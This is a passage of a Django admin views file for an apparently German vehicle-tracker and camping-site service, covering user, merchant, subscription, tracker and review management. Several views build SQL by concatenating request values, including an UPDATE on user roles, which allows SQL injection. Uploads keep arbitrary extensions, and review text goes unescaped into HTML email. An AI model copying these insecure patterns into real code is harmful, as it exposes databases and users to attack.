    vehicle_list = get_list_from_sql("select vehicletypemaster.VehicleType as v_type, vehicleset.LicensePlate as license, vehicleset.Id as id from vehicleset left join vehicletypemaster on vehicletypemaster.Id = vehicleset.VehicleType where vehicleset.UserId = "+str(user_info[0]['id']))
    return render(request,"admin/manageUserDetail.html",{"user_info":user_info[0], "vehicle_list":vehicle_list, "user_id":id,"url":"manageUser"})
def manageUserChangePassword(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == 'POST':
        aspuser = Aspnetusers.objects.get(id=id)
        aspuser.passwordhash = make_password(request.POST['password'])
        aspuser.save()
        return redirect('/Admin/ManageUser')
    user_info = Users.objects.get(userid=id)
    return render(request,"admin/manageUserChangePassword.html",{'user_info':user_info,"url":"manageUser"})
def manageUserEdit(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == 'POST':
        print(request.POST)
        aspuser = Aspnetusers.objects.get(id=id)
        aspuser.email=request.POST['email']
        aspuser.phonenumber=request.POST['phoneno']
        aspuser.save()
        user = Users.objects.get(userid=id)
        user.salutation=request.POST['salutation']
        user.firstname=request.POST['firstname']
        user.lastname=request.POST['lastname']
        user.email=request.POST['email']
        user.phoneno=request.POST['phoneno']
        user.dob=request.POST['dob']
        user.responsibleforcampingplaceid=request.POST['responsibleforcampingplaceid']
        user.address_city=request.POST['address_city']
        user.address_country=request.POST['address_country']
        user.address_street=request.POST['address_street']
        user.address_postal=request.POST['address_postal']
        user.address_state=request.POST['address_state']
        user.address_latitude=request.POST['address_latitude']
        user.address_longitude=request.POST['address_longitude']
        user.address_housenumber = request.POST['address_housenumber']
        user.company = request.POST['company']
        user.lastupdatedon=datetime.datetime.now()
        user.save()
        result = Billingaddressmaster.objects.get(userid=id)
        result.salutation = request.POST['salutation']
        result.firstname = request.POST['firstname']
        result.lastname = request.POST['lastname']
        result.email = request.POST['email']
        result.phoneno = request.POST['phoneno']
        result.road = request.POST['address_street']
        result.country = request.POST['address_country']
        result.state = request.POST['address_state']
        result.housenumber = request.POST['address_housenumber']
        result.postcode = request.POST['address_postal']
        result.place = request.POST['address_city']
        result.latitude = request.POST['address_latitude']
        result.longitude = request.POST['address_longitude']
        result.company = request.POST['company']
        result.vatnumber = request.POST['VATnumber']
        result.save()
        if  'islike' in request.POST and request.POST['islike'] == 'on':
            result = Shippingaddressmaster.objects.get(userid=id)
            result.salutation = request.POST['salutation']
            result.firstname = request.POST['firstname']
            result.lastname = request.POST['lastname']
            result.email = request.POST['email']
            result.phoneno = request.POST['phoneno']
            result.road = request.POST['address_street']
            result.country = request.POST['address_country']
            result.state = request.POST['address_state']
            result.postcode = request.POST['address_postal']
            result.place = request.POST['address_city']
            result.latitude = request.POST['address_latitude']
            result.longitude = request.POST['address_longitude']
            result.company = request.POST['company']
            result.housenumber = request.POST['address_housenumber']
            result.vatnumber = request.POST['VATnumber']
            result.is_like = True
            result.save()
        else:
            result = Shippingaddressmaster.objects.get(userid=id)
            result.salutation = request.POST['salutation']
            result.firstname = request.POST['firstname']
            result.lastname = request.POST['lastname']
            result.email = request.POST['email']
            result.phoneno = request.POST['phoneno']
            result.road = request.POST['shipping_address_street']
            result.country = request.POST['shipping_address_country']
            result.state = request.POST['shipping_address_state']
            result.postcode = request.POST['shipping_address_postal']
            result.place = request.POST['shipping_address_city']
            result.latitude = request.POST['shipping_address_latitude']
            result.longitude = request.POST['shipping_address_longitude']
            result.company = request.POST['shipping_company']
            result.vatnumber = request.POST['shipping_VATnumber']
            result.housenumber = request.POST['shipping_address_housenumber']
            result.is_like = False
            result.save()
        role_info = get_list_from_sql("select * from aspnetuserroles where UserId like '" + id + "'")
        if len(role_info) > 0:
            execute_sql("update aspnetuserroles set RoleId = '" + request.POST['user_roles'] + "' where UserId like '"+ id + "'")
        else:
            new_userrole = Aspnetuserroles(userid=id,roleid=request.POST['user_roles'])
            new_userrole.save()
        
        # userrole = Aspnetuserroles.objects.get(userid=id)
        # userrole.roleid=request.POST['user_roles']
        # userrole.save()
        return redirect('/Admin/ManageUser')
    user_info = get_list_from_sql("select users.*, aspnetusers.LockoutEnabled as lock_status, aspnetuserroles.RoleId as role_id from users inner join aspnetusers on users.UserID = aspnetusers.Id left join aspnetuserroles on aspnetuserroles.UserId = users.UserID where users.UserID like '" + id + "'")
    salutation_list = Salutationmaster.objects.all()
    campingsite_list = Campingplaces.objects.all()
    role_list = Aspnetroles.objects.all()
    try:
        shipping_address = Shippingaddressmaster.objects.get(userid=id)
        billing_address = Billingaddressmaster.objects.get(userid=id)
        subscription = get_list_from_sql("select users.*, subscriptionuserwisepayment.*, packagelist.* from subscriptionuserwisepayment left join users on users.id = subscriptionuserwisepayment.usersubscriptionid left join packagelist on packagelist.id = subscriptionuserwisepayment.subscriptionpcakage where users.userid = '" + id + "' order by subscriptionuserwisepayment.Id")
        rest_count = 0
        vehicle_count = 0
        if len(subscription) > 0:
            subscription = subscription[-1]
            cur_user = Users.objects.get(userid=id)
            vehicle_count = Vehicleset.objects.filter(userid=cur_user.id).count()
            rest_count = int(subscription["Vehiclefleetmanagement_numberofvehicles"]) - vehicle_count
        return render(request,"admin/manageUserCreate.html",{"salutation_list":salutation_list,"campingsite_list":campingsite_list,"role_list":role_list,"user_info":user_info[0],"url":"manageUser","subscription":subscription,"vehicle_count":vehicle_count,"rest_count":rest_count,"shipping_address":shipping_address,"billing_address":billing_address})
    except:
        return render(request,"admin/manageUserCreate.html",{"salutation_list":salutation_list,"campingsite_list":campingsite_list,"role_list":role_list,"user_info":user_info[0],"url":"manageUser"})
def checkEmailExist(request):
    users = Users.objects.filter(email=request.POST['email'])
    if len(users) > 0:
        return JsonResponse({"result":"fail"})
    else:
        return JsonResponse({"result":"success"})
def manageUserCreate(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == 'POST':
        print(request.POST)
        new_user = Users(salutation=request.POST['salutation'],firstname=request.POST['firstname'],lastname=request.POST['lastname'],email=request.POST['email'],phoneno=request.POST['phoneno'],dob=request.POST['dob'],responsibleforcampingplaceid=request.POST['responsibleforcampingplaceid'], address_city=request.POST['address_city'],address_country=request.POST['address_country'],address_street=request.POST['address_street'],address_postal=request.POST['address_postal'],address_state=request.POST['address_state'],address_latitude=request.POST['address_latitude'],address_housenumber=request.POST['address_housenumber'],address_longitude=request.POST['address_longitude'],createdon=datetime.datetime.now(),company=request.POST['company'])
        new_user.save()
        last_id = Users.objects.latest('id').id
        user_id = generateUserId(last_id)
        last_user = Users.objects.get(id=last_id)
        last_user.userid = user_id
        last_user.save()
        result = Billingaddressmaster()
        result.userid = user_id
        result.salutation = request.POST['salutation']
        result.firstname = request.POST['firstname']
        result.lastname = request.POST['lastname']
        result.email = request.POST['email']
        result.phoneno = request.POST['phoneno']
        result.road = request.POST['address_street']
        result.country = request.POST['address_country']
        result.state = request.POST['address_state']
        result.postcode = request.POST['address_postal']
        result.place = request.POST['address_city']
        result.housenumber = request.POST['address_housenumber']
        result.latitude = request.POST['address_latitude']
        result.longitude = request.POST['address_longitude']
        result.company = request.POST['company']
        result.vatnumber = request.POST['VATnumber']
        result.save()
        if  'islike' in request.POST and request.POST['islike'] == 'on':
            result = Shippingaddressmaster()
            result.userid = user_id
            result.salutation = request.POST['salutation']
            result.firstname = request.POST['firstname']
            result.lastname = request.POST['lastname']
            result.email = request.POST['email']
            result.phoneno = request.POST['phoneno']
            result.road = request.POST['address_street']
            result.country = request.POST['address_country']
            result.state = request.POST['address_state']
            result.postcode = request.POST['address_postal']
            result.housenumber = request.POST['address_housenumber']
            result.place = request.POST['address_city']
            result.latitude = request.POST['address_latitude']
            result.longitude = request.POST['address_longitude']
            result.company = request.POST['company']
            result.vatnumber = request.POST['VATnumber']
            result.is_like = True
            result.save()
        else:
            result = Shippingaddressmaster()
            result.userid = user_id
            result.salutation = request.POST['salutation']
            result.firstname = request.POST['firstname']
            result.lastname = request.POST['lastname']
            result.email = request.POST['email']
            result.phoneno = request.POST['phoneno']
            result.road = request.POST['shipping_address_street']
            result.country = request.POST['shipping_address_country']
            result.state = request.POST['shipping_address_state']
            result.housenumber = request.POST['shipping_address_housenumber']
            result.postcode = request.POST['shipping_address_postal']
            result.place = request.POST['shipping_address_city']
            result.latitude = request.POST['shipping_address_latitude']
            result.longitude = request.POST['shipping_address_longitude']
            result.company = request.POST['shipping_company']
            result.vatnumber = request.POST['shipping_VATnumber']
            result.is_like = False
            result.save()
        new_aspuser = Aspnetusers(id=user_id,email=request.POST['email'],passwordhash=make_password(request.POST['password']),phonenumber=request.POST['phoneno'])
        new_aspuser.save()
        new_userrole = Aspnetuserroles(userid=user_id,roleid=request.POST['user_roles'])
        new_userrole.save()
        return redirect('/Admin/ManageUser')
    salutation_list = Salutationmaster.objects.all()
    campingsite_list = Campingplaces.objects.all()
    role_list = Aspnetroles.objects.all()
    return render(request,"admin/manageUserCreate.html",{"salutation_list":salutation_list,"campingsite_list":campingsite_list,"role_list":role_list,"url":"manageUser"})
def manageUserChangeRock(request, user_id, value):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    user = Aspnetusers.objects.get(id=user_id)
    user.lockoutenabled = value
    user.save()
    return JsonResponse({'result':'success'})
def manageMerchant(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    merchant_list = Merchants.objects.all()
    return render(request,"admin/manageMerchant.html",{"merchant_list":merchant_list,"url":"manageMerchant"})
def manageMerchantChangeActiveStatus(request, merchant_id, value):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    merchant = Merchants.objects.get(id=merchant_id)
    merchant.isactive = value
    merchant.save()
    return JsonResponse({'result':'success'})
def getIncludingStatus(lat1, lng1, lat2, lng2, radius):
    
    distance_ = gmaps.distance_matrix([str(lat1) + " " + str(lng1)], [str(lat2) + " " + str(lng2)], mode='walking')['rows'][0]['elements'][0]
    distance = distance_['distance']['value']/ 1000
    print(distance)
    return distance < float(radius)
def searchFromCoordinate(request):
    loc = gmaps.geocode(request.GET["center_address"].replace("+"," "))
    try:
        response = loc[0]['geometry']['location'] 
        coordinate_list = request.GET["list_coordinates"].split("$")
        result = []
        for coordinate in coordinate_list:
            latLng = coordinate.split(",")
            if latLng[0]=="None" or latLng[1]=="None":
                result.append(False)
            else:
                result.append(getIncludingStatus(response["lat"],response["lng"],latLng[0],latLng[1],request.GET['radius']))
        return JsonResponse({'result':result})
    except:
        return JsonResponse({'result':'error'})
def manageMerchantDelete(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    merchant = Merchants.objects.get(id=id)
    merchant.delete()
    return JsonResponse({'result':'success'})
def manageMerchantDetail(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    merchant_info = Merchants.objects.get(id=id)
    user_info = Users.objects.get(id=merchant_info.userid)
    brand_list = Brandset.objects.all()
    merchant_brands = get_list_from_sql("select GROUP_CONCAT(BrandId) as brands from merchantbrands where MerchantId = "+str(id)+" group by MerchantId")
    return render(request,"admin/manageMerchantDetail.html",{"merchant_info":merchant_info,"user_info":user_info,"brand_list":brand_list,"merchant_brands":merchant_brands[0]['brands'],"url":"manageMerchant"})
def manageMerchantEdit(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == 'POST':
        instance = Merchants.objects.get(id=id)
        form = MerchantForm(request.POST, instance=instance)
        if form.is_valid():
            form.save()
            merchant_brands = Merchantbrands.objects.filter(merchantid=id)
            merchant_brands.delete()
            brand_list = request.POST["merchant_brands"].split(",")
            for brand_id in brand_list:
                new_merchant_brand = Merchantbrands(merchantid=id, brandid=brand_id)
                new_merchant_brand.save()
            return redirect('/Admin/ManageMerchant')
    merchant_info = Merchants.objects.get(id=id)
    merchant_brands = get_list_from_sql("select GROUP_CONCAT(BrandId) as brands from merchantbrands where MerchantId = "+str(id)+" group by MerchantId")
    # print(merchant_brands[0]['brands'])
    user_list = Users.objects.all()
    brand_list = Brandset.objects.all()
    return render(request,"admin/manageMerchantCreate.html",{"merchant_info":merchant_info,"user_list":user_list,"brand_list":brand_list,"merchant_brands":merchant_brands[0]['brands'],"url":"manageMerchant"})
def manageMerchantCreate(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == 'POST':
        form = MerchantForm(request.POST)
        if form.is_valid():
            form.save()
            brand_list = request.POST["merchant_brands"].split(",")
            for brand_id in brand_list:
                new_merchant_brand = Merchantbrands(merchantid=Merchants.objects.latest('id').id, brandid=brand_id)
                new_merchant_brand.save()
            return redirect('/Admin/ManageMerchant')
        else:
            print(form.errors)
    user_list = Users.objects.all()
    brand_list = Brandset.objects.all()
    return render(request,"admin/manageMerchantCreate.html",{"user_list":user_list,"brand_list":brand_list,"url":"manageMerchant"})
def manageSecurityCompany(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    company_list = get_list_from_sql("select securitycompanies.*, users.Firstname, users.Lastname from securitycompanies left join users on users.ID = securitycompanies.OwnerId")
    return render(request,"admin/manageSecurityCompany.html",{"security_company_list":company_list,"url":"manageSecurityCompany"})
def manageSecurityCompanyDetail(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    company_info = Securitycompanies.objects.get(id=id)
    user_info = Users.objects.get(id=company_info.ownerid)
    return render(request,"admin/manageSecurityCompanyDetail.html",{"user_info":user_info,"company_info":company_info,"url":"manageSecurityCompany"})
def manageSecurityCompanyEdit(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == 'POST':
        instance = Securitycompanies.objects.get(id=id)
        form = SecurityCompanyForm(request.POST, instance=instance)
        if form.is_valid():
            form.save()
            return redirect('/Admin/ManageSecurityCompany')
    user_list = Users.objects.all()
    company_info = Securitycompanies.objects.get(id=id)
    return render(request,"admin/manageSecurityCompanyCreate.html",{"user_list":user_list,"company_info":company_info,"url":"manageSecurityCompany"})
def manageSecurityCompanyCreate(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == 'POST':
        form = SecurityCompanyForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect('/Admin/ManageSecurityCompany')
        else:
            print(form.errors)
    user_list = Users.objects.all()
    return render(request,"admin/manageSecurityCompanyCreate.html",{"user_list":user_list,"url":"manageSecurityCompany"})
def manageSecurityCompanyDelete(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    company_info = Securitycompanies.objects.get(id=id)
    company_info.delete()
    return JsonResponse({'result':'success'})
def manageSubscriptionEdit(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == 'POST':
        instance = Packagelist.objects.get(id=id)
        form = PackagelistForm(request.POST, instance=instance)
        if form.is_valid():
            form.save()
            return redirect('/Admin/ManageSubscriptions')
        else:
            print(form.errors)
    subscription_info = Packagelist.objects.get(id=id)
    return render(request,"admin/manageSubscriptionCreate.html",{"subscription_info":subscription_info,"url":"manageSubscriptions"})
def manageSubscriptionDetail(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    subscription_info = Packagelist.objects.get(id=id)
    return render(request,"admin/manageSubscriptionDetail.html",{"subscription_info":subscription_info,"url":"manageSubscriptions"})
def manageSubscriptionCreate(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == 'POST':
        form = PackagelistForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect('/Admin/ManageSubscriptions')
        else:
            print(form.errors)
    return render(request,"admin/manageSubscriptionCreate.html",{"url":"manageSubscriptions"})
def manageSubscriptions(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    subscription_list = Packagelist.objects.all()
    return render(request, "admin/manageSubscriptions.html",{"subscription_list":subscription_list,"url":"manageSubscriptions"})
def manageSubscriptionChangeActiveStatus(request, id, value):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    subscription = Packagelist.objects.get(id=id)
    subscription.isactive = value
    subscription.save()
    return JsonResponse({'result':'success'})
def manageSubscriptionDelete(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    subscription = Packagelist.objects.get(id=id)
    subscription.delete()
    return JsonResponse({'result':'success'})
def manageSubscriptionInvoice(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    return render(request,"admin/manageSubscriptionInvoice.html",{"url":"manageSubscriptionInvoice"})
def manageTracker(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    tracker_list = get_list_from_sql("select trackerlisitem.Id as id, trackercategory.Tracker_Category as category_name, trackerlisitem.Trackername as tracker_name, trackerlisitem.Articlenumber as article_number, trackerlisitem.Price as price, trackerlisitem.DicountPrice as discount_price, trackerlisitem.Isactive as isactive from trackerlisitem left join trackercategory on trackerlisitem.TrackerCategory = trackercategory.Id order by id")
    return render(request,"admin/manageTracker.html",{"tracker_list":tracker_list,"url":"manageTracker"})
def manageTrackerImageUpload(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == 'POST' and request.FILES['image']:
        myfile = request.FILES['image']
        limit = 5 * 1024 * 1024
        if myfile.size > limit:
            return JsonResponse({'result':'fail','message':'Datei zu groß. Die Größe sollte 5 MiB nicht überschreiten.'})
        fs = FileSystemStorage()
        old_name, extension = os.path.splitext(myfile.name)
        new_name = datetime.datetime.now().strftime("%Y%m%d%H%M%S") + extension
        filename = fs.save("static_in_env/upload/"+new_name, myfile)
        new_image = Trackeritemimages(imagename=new_name,trackerid=id)
        new_image.save()
        return JsonResponse({'result':'success','image_name':new_name,'image_id':Trackeritemimages.objects.latest('id').id})
    return JsonResponse({'result':'fail','message':'Datei ist nicht vorhanden.'})
def manageTrackerImageDelete(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    image = Trackeritemimages.objects.get(id=id)
    image.delete()
    return JsonResponse({'result':'success'})

def manageTrackerEdit(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == 'POST':
        instance = Trackerlisitem.objects.get(id=id)
        form = TrackerForm(request.POST, instance=instance)
        if form.is_valid():
            form.save()
            return redirect('/Admin/ManageTracker')
        else:
            print(form.errors)
    tracker = Trackerlisitem.objects.get(id=id)
    category_list = Trackercategory.objects.all()
    tracker_images = Trackeritemimages.objects.filter(trackerid=id)
    return render(request,"admin/manageTrackerCreate.html",{"category_list":category_list,"tracker_info":tracker,"tracker_images":tracker_images,"url":"manageTracker"})
def manageTrackerCreate(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == 'POST':
        form = TrackerForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect('/Admin/ManageTracker')
        else:
            print(form.errors)
    category_list = Trackercategory.objects.all()
    return render(request,"admin/manageTrackerCreate.html",{"category_list":category_list,"url":"manageTracker"})
def manageTrackerDetail(request,id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    tracker = Trackerlisitem.objects.get(id=id)
    category_info = Trackercategory.objects.get(id=tracker.trackercategory)
    tracker_images = Trackeritemimages.objects.filter(trackerid=id)
    return render(request,"admin/manageTrackerDetail.html",{"category_name":category_info.tracker_category,"tracker_info":tracker,"tracker_images":tracker_images,"url":"manageTracker"})
def manageTrackerChangeActiveStatus(request, id, value):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    tracker = Trackerlisitem.objects.get(id=id)
    tracker.isactive = value
    tracker.save()
    return JsonResponse({'result':'success'})
def manageTrackerDelete(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    tracker = Trackerlisitem.objects.get(id=id)
    tracker.delete()
    return JsonResponse({'result':'success'})
def shopCategory(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    category_list = Trackercategory.objects.all()
    return render(request, "admin/shopCategory.html",{"category_list":category_list,"url":"shopCategory"})
def shopCategorySubmit(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.GET["id"] == 'new':
        category = Trackercategory(tracker_category=request.GET["name"], isactive=request.GET["isactive"])
        category.save()
        return JsonResponse({'result':'success','type':'new','id':Trackercategory.objects.latest('id').id})
    else:
        category = Trackercategory.objects.get(id=request.GET['id'])
        category.tracker_category = request.GET["name"]
        category.isactive = request.GET["isactive"]
        category.save()
        return JsonResponse({'result':'success','type':'update'})
def shopCategoryDelete(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    category = Trackercategory.objects.get(id=id)
    category.delete()
    return JsonResponse({'result':'success'})
def manageForms(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    form_list = TblAdminformssection.objects.all()
    return render(request,"admin/manageForms.html",{"url":"manageForms","form_list":form_list})
def manageFormDelete(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    form = TblAdminformssection.objects.get(id=id)
    form.delete()
    return JsonResponse({'result':'success'})
def manageFormUpload(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == 'POST' and request.FILES['form_file']:
        myfile = request.FILES['form_file']
        fs = FileSystemStorage()
        old_name, extension = os.path.splitext(myfile.name)
        new_name = datetime.datetime.now().strftime("%Y%m%d%H%M%S") + extension
        filename = fs.save("static_in_env/upload/"+new_name, myfile)
        new_form = TblAdminformssection(title=request.POST['title'],description=request.POST['description'],filename=old_name,filepath=new_name)
        new_form.save()
        return JsonResponse({'result':'success'})
    return JsonResponse({'result':'fail','message':'Datei ist nicht vorhanden.'})
def manageCustomerServicedata(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == 'POST':
        if request.POST["id"] != "":
            instance = TblHeadercontent.objects.get(id=request.POST["id"])
            form = HeaderContentForm(request.POST, instance=instance)
        else:
            form = HeaderContentForm(request.POST)
        if form.is_valid():
            form.save()
        else:
            print(form.errors)
    header_content = TblHeadercontent.objects.all()
    category_list = Trackercategory.objects.all()
    if len(header_content) > 0:
        return render(request, "admin/manageCustomerServicedata.html",{"header_content":header_content[0],"url":"manageCustomerServicedata","category_list":category_list})
    else:
        return render(request, "admin/manageCustomerServicedata.html",{"url":"manageCustomerServicedata"})
def saveFile(file):
    fs = FileSystemStorage()
    old_name, extension = os.path.splitext(file.name)
    ran = ''.join(random.choices(string.ascii_lowercase + string.digits, k = 4)) 
    new_name = datetime.datetime.now().strftime("%Y%m%d%H%M%S") + ran + extension
    filename = fs.save("static_in_env/upload/"+new_name, file)
    return new_name
def manageCustomerGraphics(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == 'POST':
        if "banner_image1" in request.FILES: banner_image1 = request.FILES['banner_image1']
        if "banner_image2" in request.FILES: banner_image2 = request.FILES['banner_image2']
        if "banner_image3" in request.FILES: banner_image3 = request.FILES['banner_image3']
        if "product_image1" in request.FILES: product_image1 = request.FILES['product_image1']
        if "product_image2" in request.FILES: product_image2 = request.FILES['product_image2']
        if "product_image3" in request.FILES: product_image3 = request.FILES['product_image3']
        if "shop_background_image" in request.FILES: shop_background = request.FILES['shop_background_image']
        if request.POST["id"] != "":
            graphics = Websitegraphics.objects.get(id=request.POST["id"])
        else:
            graphics = Websitegraphics()
        if "banner_image1" in request.FILES: graphics.banner_image1 = saveFile(banner_image1)
        if "banner_image2" in request.FILES: graphics.banner_image2 = saveFile(banner_image2)
        if "banner_image3" in request.FILES: graphics.banner_image3 = saveFile(banner_image3)
        if "product_image1" in request.FILES: graphics.product_image1 = saveFile(product_image1)
        if "product_image2" in request.FILES: graphics.product_image2 = saveFile(product_image2)
        if "product_image3" in request.FILES: graphics.product_image3 = saveFile(product_image3)
        if "shop_background_image" in request.FILES: graphics.shop_background_image = saveFile(shop_background)
        graphics.save()
    result = Websitegraphics.objects.all()
    if len(result) > 0:
        return render(request, "admin/manageCustomerGraphics.html",{"graphics":result[0],"url":"manageCustomerGraphics"})    
    else:
        return render(request, "admin/manageCustomerGraphics.html",{"url":"manageCustomerGraphics"})
def managePromotionCredit(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    subscriptionList = get_list_from_sql("select s.Firstname as firstname, s.Surname as surname, s.Country as country, s.City as city, s.RegEmail as regemail, s.RegPhoneno as regphoneno, s.Id as id from tbl_tempsubscriptiongocardlessdata as s where id not in (select SubscriptionId from promotioncredit)")
    promotionCreditList = get_list_from_sql("select u.Firstname as firstname, u.Lastname as surname, p.CreditAmt as credit, p.DebitAmt as debit, p.Id as id from promotioncredit as p left join users as u on p.UserId = u.ID")
    return render(request,"admin/managePromotionCredit.html",{"subscription_list":subscriptionList,"promotion_list":promotionCreditList,"url":"managePromotionCredit"})
def managePromotionCreditCreate(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == "POST":
        promotion_subscription = TblTempsubscriptiongocardlessdata(firstname=request.POST['firstname'],surname=request.POST['surname'],regemail=request.POST['regemail'],regphoneno=request.POST["regphoneno"],country=request.POST['country'],city=request.POST['city'])
        promotion_subscription.save()
        if request.POST['userid'] != "" and request.POST["credit"] != "":
            promotion_credit = Promotioncredit(userid=request.POST['userid'],subscriptionid=TblTempsubscriptiongocardlessdata.objects.latest('id').id,creditamt=request.POST["credit"],debitamt=0)
            promotion_credit.save()
        return redirect('/Admin/ManagePromotionCredit')
    user_list = Users.objects.all()
    return render(request,"admin/managePromotionCreditEdit.html",{"user_list":user_list,"url":"managePromotionCredit"})
def managePromotionCreditEdit(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == "POST":
        promotion_credit = Promotioncredit(userid=request.POST['userid'],subscriptionid=id,creditamt=request.POST["credit"],debitamt=0)
        promotion_credit.save()
        return redirect('/Admin/ManagePromotionCredit')
    promotion_info = TblTempsubscriptiongocardlessdata.objects.get(id=id)
    user_list = Users.objects.all()
    return render(request,"admin/managePromotionCreditEdit.html",{"promotion_info":promotion_info,"user_list":user_list,"url":"managePromotionCredit"})
def managePromotionCreditSubscriptionDelete(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    subscription = TblTempsubscriptiongocardlessdata.objects.get(id=id)
    subscription.delete()
    return JsonResponse({'result':'success'})
def managePromotionCreditDelete(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    promotion_credit = Promotioncredit.objects.get(id=id)
    promotion_credit.delete()
    return JsonResponse({'result':'success'})
def saveReview(request):
    recaptcha_response = request.POST.get('g-recaptcha-response')
    url = 'https://www.google.com/recaptcha/api/siteverify'
    values = {
        'secret': settings.GOOGLE_RECAPTCHA_SECRET_KEY,
        'response': recaptcha_response
    }
    data = urllib.parse.urlencode(values).encode()
    req =  urllib.request.Request(url, data=data)
    response = urllib.request.urlopen(req)
    result = json.loads(response.read().decode())
    if result['success']:
        review = TblCustomerreviewratting()
        review.firstname = request.POST['review_firstname']
        review.lastname = request.POST['review_familyname']
        review.email = request.POST['review_email']
        review.phonenumber = request.POST['review_phonenumber']
        review.rate_star = request.POST['rate']
        review.shortdescription = request.POST['content']
        review.isdisplay = 1
        review.save()
        to_emails = []
        to_emails.append(settings.EMAIL_CONTACT)
        new_mail = Mailbox()
        new_mail.name = request.POST['review_firstname'] + " " + request.POST['review_familyname']
        new_mail.email = request.POST['review_email']
        new_mail.regarding = "Bewerten Sie uns"
        new_mail.phone = request.POST['review_phonenumber']
        new_mail.message = request.POST['content']
        new_mail.datetime = datetime.datetime.now()
        new_mail.flag = 0
        new_mail.save()
        message="Name: " + request.POST['review_firstname'] + " " + request.POST['review_familyname'] + "<br> E-Mail Adresse: " + request.POST['review_email'] + "<br> Betreff: Bewerten Sie uns<br> Kontakt Telefon: " + request.POST["review_phonenumber"] + "<br> Inhalt: " + request.POST["content"]
        msg = EmailMultiAlternatives("Bewerten Sie uns", "", settings.EMAIL_HOST_USER, to_emails)
        msg.attach_alternative(message, "text/html")
        msg.send()
    return redirect('/')
    
def reviewratting(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    review_list = TblCustomerreviewratting.objects.all().order_by('-id')
    return render(request,"admin/reviewratting.html",{"review_list":review_list,"url":"reviewratting"})
def reviewRattingDelete(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    review_info = TblCustomerreviewratting.objects.get(id=id)
    review_info.delete()
    return JsonResponse({'result':'success'})
def reviewRattingDetail(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    review_info = TblCustomerreviewratting.objects.get(id=id)
    return render(request,"admin/reviewRattingDetail.html",{"review_info":review_info,"url":"reviewratting"})

def reviewRattingChangeLockStatus(request, id, value):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    review_info = TblCustomerreviewratting.objects.get(id=id)
